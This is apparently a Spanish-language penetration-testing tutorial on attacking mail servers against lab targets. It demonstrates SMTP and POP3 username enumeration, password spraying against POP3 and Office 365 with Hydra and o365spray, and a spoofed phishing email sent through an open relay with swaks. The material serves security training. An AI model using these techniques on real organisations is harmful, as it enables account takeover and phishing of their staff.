Un `mail server` (a veces también referido como un email server) es un servidor que maneja y entrega correo electrónico a través de una red, usualmente a través de Internet. Un mail server puede recibir correos electrónicos de un dispositivo cliente y enviarlos a otros mail servers. Un mail server también puede entregar correos electrónicos a un dispositivo cliente. Un cliente suele ser el dispositivo donde leemos nuestros correos electrónicos (computadoras, smartphones, etc.).

Cuando presionamos el botón `Send` en nuestra aplicación de correo electrónico (email client), el programa establece una conexión con un servidor `SMTP` en la red o en Internet. El nombre `SMTP` significa Simple Mail Transfer Protocol, y es un protocolo para entregar correos electrónicos de clientes a servidores y de servidores a otros servidores.

Cuando descargamos correos electrónicos a nuestra aplicación de correo electrónico, esta se conecta a un servidor `POP3` o `IMAP4` en Internet, lo cual permite al usuario guardar mensajes en un buzón de servidor y descargarlos periódicamente.

Por defecto, los clientes `POP3` eliminan los mensajes descargados del mail server. Este comportamiento dificulta el acceso al correo electrónico en múltiples dispositivos, ya que los mensajes descargados se almacenan en la computadora local. Sin embargo, generalmente podemos configurar un cliente `POP3` para mantener copias de los mensajes descargados en el servidor.

Por otro lado, por defecto, los clientes `IMAP4` no eliminan los mensajes descargados del mail server. Este comportamiento facilita el acceso a los mensajes de correo electrónico desde múltiples dispositivos. Vamos a ver cómo podemos identificar mail servers.

![text](https://academy.hackthebox.com/storage/modules/116/SMTP-IMAP-1.png)

---

## Enumeration

Los mail servers son complejos y generalmente requieren que enumeremos múltiples servidores, puertos y servicios. Además, hoy en día la mayoría de las empresas tienen sus servicios de correo electrónico en la nube con servicios como [Microsoft 365](https://www.microsoft.com/en-ww/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook) o [G-Suite](https://workspace.google.com/solutions/new-business/). Por lo tanto, nuestro enfoque para atacar el servicio de correo electrónico depende del servicio en uso.

Podemos usar el registro DNS `Mail eXchanger` (`MX`) para identificar un mail server. El registro MX especifica el mail server responsable de aceptar mensajes de correo electrónico en nombre de un nombre de dominio. Es posible configurar varios registros MX, típicamente apuntando a una serie de mail servers para balanceo de carga y redundancia.

Podemos usar herramientas como `host` o `dig` y sitios web en línea como [MXToolbox](https://mxtoolbox.com/) para consultar información sobre los registros MX:

### Host - MX Records

```bash
host -t MX hackthebox.eu

hackthebox.eu mail is handled by 1 aspmx.l.google.com.
```

```bash
host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

### DIG - MX Records

```bash
dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

```bash
dig mx inlanefreight.com | grep "MX" | grep -v ";"

inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
```

### Host - A Records

```bash
host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```

Estos registros `MX` indican que los primeros tres servicios de correo están utilizando servicios en la nube G-Suite (aspmx.l.google.com), Microsoft 365 (microsoft-com.mail.protection.outlook.com) y Zoho (mx.zoho.com), y el último puede ser un mail server personalizado alojado por la empresa.

Esta información es esencial porque los métodos de enumeración pueden diferir de un servicio a otro. Por ejemplo, la mayoría de los proveedores de servicios en la nube utilizan su implementación de mail server y adoptan autenticación moderna, lo que abre nuevos y únicos vectores de ataque para cada proveedor de servicios. Por otro lado, si la empresa configura el servicio, podríamos descubrir malas prácticas y configuraciones incorrectas que permitan ataques comunes en los protocolos de mail server.

Si estamos apuntando a una implementación de mail server personalizada como `inlanefreight.htb`, podemos enumerar los siguientes puertos:

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/587`|SMTP Encrypted/[STARTTLS](https://en.wikipedia.org/wiki/Opportunistic_TLS)|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|

Podemos usar la opción de script por defecto `-sC` de `Nmap` para enumerar esos puertos en el sistema objetivo:

```bash
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
MAC Address: 00:00:00:00:00:00 (VMware)
```

---

## Misconfigurations

Los servicios de correo electrónico utilizan autenticación para permitir a los usuarios enviar y recibir correos electrónicos. Una mala configuración puede ocurrir cuando el servicio SMTP permite autenticación anónima o soporta protocolos que pueden ser utilizados para enumerar nombres de usuario válidos.

### Authentication

El servidor SMTP tiene diferentes comandos que pueden ser usados para enumerar nombres de usuario válidos `VRFY`, `EXPN` y `RCPT TO`. Si logramos enumerar nombres de usuario válidos, podemos intentar ataques de password spray, fuerza bruta o adivinar una contraseña válida. Vamos a explorar cómo funcionan esos comandos.

`VRFY` este comando instruye al servidor SMTP receptor a verificar la validez de un nombre de usuario de correo electrónico particular. El servidor responderá indicando si el usuario existe o no. Esta característica puede ser deshabilitada.

### VRFY Command

```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

`EXPN` es similar a `VRFY`, excepto que cuando se usa con una lista de distribución, listará todos los usuarios en esa lista. Esto puede ser un problema mayor que el comando `VRFY` ya que los sitios a menudo tienen un alias como "all."

### EXPN Command

```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

`RCPT TO` identifica al destinatario del mensaje de correo electrónico. Este comando puede ser repetido múltiples veces para un mensaje dado para entregar un solo mensaje a múltiples destinatarios.

### RCPT TO Command

```bash
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com

250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```

También podemos usar el protocolo `POP3` para enumerar usuarios dependiendo de la implementación del servicio. Por ejemplo, podemos usar el comando `USER` seguido del nombre de usuario, y si el servidor

 responde `OK`. Esto significa que el usuario existe en el servidor.

### USER Command

```bash
telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
```

Para automatizar nuestro proceso de enumeración, podemos usar una herramienta llamada [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). Podemos especificar el modo de enumeración con el argumento `-M` seguido de `VRFY`, `EXPN` o `RCPT`, y el argumento `-U` con un archivo que contiene la lista de usuarios que queremos enumerar. Dependiendo de la implementación del servidor y el modo de enumeración, necesitamos agregar el dominio para la dirección de correo electrónico con el argumento `-D`. Finalmente, especificamos el objetivo con el argumento `-t`.

```bash
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7

Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

---

## Cloud Enumeration

Como se mencionó, los proveedores de servicios en la nube utilizan su propia implementación para los servicios de correo electrónico. Esos servicios comúnmente tienen características personalizadas que podemos abusar para la operación, como la enumeración de nombres de usuario. Vamos a usar Office 365 como ejemplo y explorar cómo podemos enumerar nombres de usuario en esta plataforma en la nube.

[o365spray](https://github.com/0xZDH/o365spray) es una herramienta de enumeración de nombres de usuario y de password spraying dirigida a Microsoft Office 365 (O365) desarrollada por [ZDH](https://twitter.com/0xzdh). Esta herramienta reimplementa una colección de técnicas de enumeración y spray investigadas e identificadas por aquellos mencionados en [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments). Primero, vamos a validar si nuestro dominio objetivo está utilizando Office 365.

### O365 Spray

```bash
python3 o365spray.py --validate --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:46:40

>----------------------------------------<

[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
```

Ahora, podemos intentar identificar nombres de usuario.

```bash
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
                                       
            *** O365 Spray ***             

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > enum           :  True
   > userfile       :  users.txt
   > enum_module    :  office
   > rate           :  10 threads
   > timeout        :  25 seconds
   > start          :  2022-04-13 09:48:03

>----------------------------------------<

[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
[2022-04-13 09:48:10,415] INFO : 

[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'

[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
```

---

## Password Attacks

Podemos usar `Hydra` para realizar un password spray o fuerza bruta contra servicios de correo electrónico como `SMTP`, `POP3` o `IMAP4`. Primero, necesitamos obtener una lista de nombres de usuario y una lista de contraseñas y especificar qué servicio queremos atacar. Veamos un ejemplo para `POP3`.

### Hydra - Password Attack

```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
[DATA] attacking pop3://10.10.110.20:110/
[110][pop3] host: 10.129.42.197   login: john   password: Company01!
1 of 1 target successfully completed, 1 valid password found
```

Si los servicios en la nube soportan los protocolos SMTP, POP3 o IMAP4, podríamos intentar realizar password spray utilizando herramientas como `Hydra`, pero estas herramientas generalmente son bloqueadas. Podemos intentar usar herramientas personalizadas como [o365spray](https://github.com/0xZDH/o365spray) o [MailSniper](https://github.com/dafthack/MailSniper) para Microsoft Office 365 o [CredKing](https://github.com/ustayready/CredKing) para Gmail o Okta. Ten en cuenta que estas herramientas deben estar actualizadas porque si el proveedor de servicios cambia algo (lo cual sucede a menudo), las herramientas pueden dejar de funcionar. Este es un ejemplo perfecto de por qué debemos entender qué están haciendo nuestras herramientas y tener el conocimiento para modificarlas si no funcionan correctamente por alguna razón.

### O365 Spray - Password Spraying

```bash
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  msplaintext.xyz
   > spray          :  True
   > password       :  March2022!
   > userfile       :  usersfound.txt
   > count          :  1 passwords/spray
   > lockout        :  1.0 minutes
   > spray_module   :  oauth2
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2022-04-14 12:26:31

>----------------------------------------<

[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
[2022-04-14 12:26:33,025] INFO : [VALID] lewen@ms

plaintext.xyz:March2022!
[2022-04-14 12:26:33,048] INFO : 

[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'

[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
```

---

## Protocol Specifics Attacks

Un open relay es un Simple Mail Transfer Protocol (`SMTP`) server que está configurado incorrectamente y permite un reenvío de correo no autenticado. Los servidores de mensajería que están configurados accidentalmente o intencionalmente como open relays permiten que el correo de cualquier fuente se reenvíe de manera transparente a través del open relay server. Este comportamiento enmascara la fuente de los mensajes y hace que parezca que el correo se originó desde el open relay server.

### Open Relay

Desde el punto de vista de un atacante, podemos abusar de esto para phishing enviando correos electrónicos como usuarios inexistentes o suplantando la dirección de correo electrónico de otra persona. Por ejemplo, imagina que estamos apuntando a una empresa con un mail server open relay, e identificamos que utilizan una dirección de correo electrónico específica para enviar notificaciones a sus empleados. Podemos enviar un correo electrónico similar usando la misma dirección y agregar nuestro enlace de phishing con esta información. Con el script `nmap smtp-open-relay`, podemos identificar si un puerto SMTP permite un open relay.

```bash
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
Nmap scan report for 10.10.11.213
Host is up (0.28s latency).

PORT   STATE SERVICE
25/tcp open  smtp
|_smtp-open-relay: Server is an open relay (14/16 tests)
```

A continuación, podemos usar cualquier cliente de correo para conectarnos al mail server y enviar nuestro correo electrónico.

```bash
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=== Trying 10.10.11.213:25...
=== Connected to 10.10.11.213.
<-  220 mail.localdomain SMTP Mailer ready
 -> EHLO parrot
<-  250-mail.localdomain
<-  250-SIZE 33554432
<-  250-8BITMIME
<-  250-STARTTLS
<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
<-  250 HELP
 -> MAIL FROM:<notifications@inlanefreight.com>
<-  250 OK
 -> RCPT TO:<employees@inlanefreight.com>
<-  250 OK
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Thu, 29 Oct 2020 01:36:06 -0400
 -> To: employees@inlanefreight.com
 -> From: notifications@inlanefreight.com
 -> Subject: Company Notification
 -> Message-Id: <20201029013606.775675@parrot>
 -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
 -> 
 -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
 -> 
 -> 
 -> .
<-  250 OK
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```